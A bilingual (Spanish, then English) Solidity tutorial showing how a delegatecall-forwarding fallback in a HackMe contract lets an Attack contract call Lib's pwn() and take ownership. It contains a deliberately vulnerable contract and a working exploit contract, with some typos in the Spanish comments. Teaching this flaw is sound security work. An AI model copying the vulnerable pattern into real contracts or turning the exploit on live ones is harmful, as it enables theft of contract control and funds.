//Delegatecall o llamada delegada
// Delegatecall es dificil de usar y un mal uso puede llevar a resultados devastadores.
/* Hay que tener dos cosas en cuenta al usar delegatecall
1- que preserva el contexto general ( si es storage, caller, etc..)
2- el diseño de almacenamiento debe ser el mismo para el contrato que llama delegado y el contrato que recibe la llamada
*/
// CONTRATO DE EJEMPLO

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
HackMe es un contrato que utiliza la llamada delegada para ejecutar código.
No es obvio que se pueda cambiar el propietario de HackMe ya que no hay
dentro de HackMe para hacerlo. Sin embargo, un atacante puede secuestrar el
contrato mediante la explotación de la llamada delegada,
veamos como.


1. Alice despliega Lib
2. Alice despkiega HackMe con la direccion of Lib
3. Eve despliega Attack con la direccion de HackMe
4. Eve calls Attack.attack()
5. Attack es ahora dueñp de HackMe

Que ha pasado?
Eve ha llamado a  Attack.attack().
Attack ejecuta la funcion fallback de HackMe a través dek selector pwn().
HackMe  continua la llamada hacia Lib usando delegatecall.
Aqui msg.data contiene la funcion selector de pwn().
Aqui dice a Solidity de ejecutar la funcion pwn() dentro de Lib.
La funcion pwn() actualiza el propietario del msg.sender.

Delegatecall ejecuta el codigo de Lib usando el contexto de Hackme.
Por lo tanto el storage de Hackme se actualiza a msg.sender y msg.sender es el propietario de Hackme , por lo tanto el atacante.
.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
HackMe is a contract that uses delegatecall to execute code.
It is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
